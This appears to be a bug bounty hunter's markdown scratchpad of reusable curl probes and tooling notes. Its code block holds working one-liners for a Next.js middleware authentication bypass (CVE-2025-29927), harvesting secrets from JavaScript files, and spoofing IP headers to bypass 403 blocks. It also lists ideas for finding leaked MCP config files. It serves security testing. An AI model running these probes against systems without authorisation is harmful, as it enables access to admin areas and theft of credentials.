# bug.md — quick scratchpad

Open notes, one-liners, things I keep forgetting. Promoted ideas graduate to proper files.

## Probes I keep retyping

```bash
# Next.js CVE-2025-29927 middleware bypass
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -I https://target/admin

# Fast tech fingerprint
curl -sI "$U" | awk 'NR==1 || /^(server|x-powered|x-amz|cf-|via|set-cookie):/I'

# Wayback params quick pull
curl -s "https://web.archive.org/cdx/search/cdx?url=*.$T/*&output=text&fl=original&collapse=urlkey" | head -2000

# JS secrets quick grep
curl -s "$JSURL" | grep -oE "(api[_-]?key|secret|token|bearer)[\"':= ]+[A-Za-z0-9/_.+-]{16,}"

# 403 bypass shuffle
for h in X-Forwarded-For X-Real-IP X-Originating-IP X-Custom-IP-Authorization; do
  curl -s -o /dev/null -w "$h -> %{http_code}\n" -H "$h: 127.0.0.1" "$U"
done
```

## Gotchas (stuff that burned me)

- `httpx -title -sc -tech-detect` changed flags between v1.3 → v1.6 — check `--help`
- Caido filter `req.host.cont:"admin"` not `request.host.contains`
- Cloudflare trims `X-Forwarded-For` from client — set via custom header if origin trusts one
- nuclei `-severity` is comma-sep, not space
- gf patterns use ERE not PCRE — no `(?<=...)`

## Read queue

- PortSwigger Research — monthly
- watchTowr Labs — appliance deep-dives
- Anthropic + OpenAI security blogs

## Ideas

- gf pattern for MCP config leaks (`.cursor/mcp.json`, `.vscode/mcp.json` in wayback)
- nuclei template: Next.js middleware bypass with auto admin-route discovery
- Caido plugin: highlight reflections with `@kdai-reflect` tag
